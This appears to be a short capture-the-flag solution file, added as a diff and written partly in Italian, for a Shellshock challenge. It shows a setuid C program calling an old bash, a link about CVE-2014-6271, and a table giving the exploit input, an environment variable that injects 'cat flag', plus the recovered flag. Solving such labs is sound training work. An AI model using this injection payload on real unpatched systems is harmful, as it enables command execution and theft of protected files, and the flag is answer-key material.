@@ -1,0 +1,22 @@
+#include <stdio.h>
+int main(){
+	setresuid(getegid(), getegid(), getegid());
+	setresgid(getegid(), getegid(), getegid());
+	system("/home/shellshock/bash -c 'echo shock_me'");
+	return 0;
+}
+
+Shellshock è un bug della bash trovato nel 2014.
+https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability
+
+-----------------------------------------------------------------
+| input: | env val='() { :;}; cat flag' ./shellshock		|
+|--------|------------------------------------------------------|
+| flag:  | only if I knew CVE-2014-6271 ten years ago..!!	|
+-----------------------------------------------------------------
+
+
+
+
+
+
